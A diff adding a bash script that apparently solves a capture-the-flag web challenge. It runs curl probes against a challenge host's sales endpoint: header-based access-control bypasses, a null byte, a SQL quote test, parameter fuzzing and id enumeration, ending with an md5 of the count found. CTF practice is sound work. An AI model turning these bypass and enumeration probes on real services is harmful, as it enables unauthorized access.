@@ -1,0 +1,84 @@
+URL="https://chl-205fef06-b61b-4038-89c4-b67c61b8ccde-ventas.softwareseguro.com.ar/ventas/?id=1"
+curl -s -i -H "X-Forwarded-For: 127.0.0.1" "$URL"
+
+
+URL="https://chl-205fef06-b61b-4038-89c4-b67c61b8ccde-ventas.softwareseguro.com.ar/ventas/?id=1"
+curl -s -i -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" "$URL"
+
+
+BASE="https://chl-205fef06-b61b-4038-89c4-b67c61b8ccde-ventas.softwareseguro.com.ar/ventas"
+echo "=== sin parametros (400) ==="; curl -s "$BASE/"
+echo; echo "=== con id=1 (403) ==="; curl -s "$BASE/?id=1"
+
+curl -s "https://chl-205fef06-b61b-4038-89c4-b67c61b8ccde-ventas.softwareseguro.com.ar/ventas/"
+
+
+
+BASE="https://chl-205fef06-b61b-4038-89c4-b67c61b8ccde-ventas.softwareseguro.com.ar/ventas/"
+for p in id ids venta ventas vendedor empresa competencia competidor cliente usuario user page pagina limit offset desde hasta fecha anio year mes dia formato format tipo categoria sucursal zona region pais q query buscar search nombre codigo numero total cantidad all todos; do
+  body=$(curl -s "$BASE?$p=1")
+  echo "$p=1 -> $body"
+done
+
+
+
+BASE="https://chl-205fef06-b61b-4038-89c4-b67c61b8ccde-ventas.softwareseguro.com.ar/ventas/"
+for v in 0 1 2 3 4 5 6 7 8 9 10 99 100 1000 2019 -1 admin all todos competencia; do
+  body=$(curl -s "$BASE?id=$v")
+  echo "id=$v -> ${body:0:60}"
+done
+
+
+BASE="https://chl-205fef06-b61b-4038-89c4-b67c61b8ccde-ventas.softwareseguro.com.ar/ventas/"
+count=0
+for id in $(seq 0 2000); do
+  body=$(curl -s "$BASE?id=$id")
+  if [ "$body" = "Forbidden" ]; then
+    count=$((count+1))
+  fi
+done
+echo "Ventas (ids Forbidden) encontradas: $count"
+
+
+U="https://chl-205fef06-b61b-4038-89c4-b67c61b8ccde-ventas.softwareseguro.com.ar/ventas/?id=1"
+curl -s -X POST "$U"                                  # cambiar el método
+curl -s -H "X-Original-URL: /ventas/?id=1" "$U"       # header de bypass
+curl -s "$U&id=1"                                      # duplicar el parámetro
+curl -s "${U}%00"                                      # null byte
+
+
+
+BASE="https://chl-205fef06-b61b-4038-89c4-b67c61b8ccde-ventas.softwareseguro.com.ar/ventas/"
+echo "=== id=1 (daba Forbidden) ==="; curl -s "$BASE?id=1"
+echo; echo "=== id=2 (daba Not found) ==="; curl -s "$BASE?id=2"
+
+
+BASE="https://chl-205fef06-b61b-4038-89c4-b67c61b8ccde-ventas.softwareseguro.com.ar/ventas/"
+curl -s "$BASE?id=abc"      # id no numérico
+curl -s "$BASE?id="         # id vacío
+curl -s "$BASE?id[]=1"      # id como array
+curl -s "$BASE?id=1'"       # comilla, por si hay SQL detrás
+
+
+
+BASE="https://chl-205fef06-b61b-4038-89c4-b67c61b8ccde-ventas.softwareseguro.com.ar/ventas/"
+count=0; last=0
+for id in $(seq 0 3000); do
+  body=$(curl -s "$BASE?id=$id")
+  if [ "$body" = "Forbidden" ]; then count=$((count+1)); last=$id; fi
+done
+echo "Forbidden (ventas existentes) entre 0 y 3000: $count"
+echo "ultimo id Forbidden visto: $last"
+
+
+BASE="https://chl-205fef06-b61b-4038-89c4-b67c61b8ccde-ventas.softwareseguro.com.ar/ventas/"
+extra=0
+for id in $(seq 2593 5000); do
+  body=$(curl -s "$BASE?id=$id")
+  if [ "$body" = "Forbidden" ]; then extra=$((extra+1)); echo "OJO: id=$id es Forbidden"; fi
+done
+echo "Forbidden extra entre 2593 y 5000: $extra"
+
+
+printf '%s' "1641" | md5sum
+
